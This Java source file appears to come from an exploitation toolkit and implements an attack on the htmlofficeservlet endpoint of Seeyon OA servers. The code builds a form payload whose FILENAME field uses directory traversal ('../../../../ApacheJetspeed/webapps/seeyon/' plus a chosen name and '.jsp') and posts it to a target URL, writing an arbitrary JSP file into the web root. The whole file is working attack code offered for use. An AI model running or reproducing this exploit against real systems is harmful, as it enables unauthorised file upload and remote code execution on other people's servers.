package com.droplab.Controller.Seeyon.Service;

import com.droplab.Controller.Seeyon.Common.HtmlOfficeServletPayload;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;

public class htmlofficeservlet extends BugService {
    private final String contentPath = "/htmlofficeservlet";
    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String count = null;  //
                String url = null;
                String filepath = null;
                String filename = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("count")) {
                        count = params.get(key);
                    } else if (key.equals("url")) {
                        url = params.get(key);
                    }else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("filename")) {
                        filename = params.get(key);
                    }
                }
                if (! url.equals("")&& url!=null){
                    HashMap headers = new HashMap();
                    CommonUtils.hashMapClone(InfoUtils.headers,headers);
                    headers.put("Referer", url);

                    /*生成payload*/
                    Date date = new Date();
                    SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

                    HashMap hashMap = new HashMap();
                    hashMap.put("RECORDID","0");
                    hashMap.put("CREATEDATE",simpleDateFormat.format(date));
                    hashMap.put("originalFileId","");
                    hashMap.put("OPTION","SAVEASIMG");
                    hashMap.put("FILENAME","../../../../ApacheJetspeed/webapps/seeyon/"+filename+".jsp");
                    String payload = HtmlOfficeServletPayload.getPayload(hashMap, filepath, Integer.valueOf(count));
                    //System.out.println(payload);

                    HttpUtils.set_Content_Type("application/x-www-form-urlencoded");
                    Connection.Response response = HttpUtils.post(url + contentPath, headers, payload);
                    return response;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
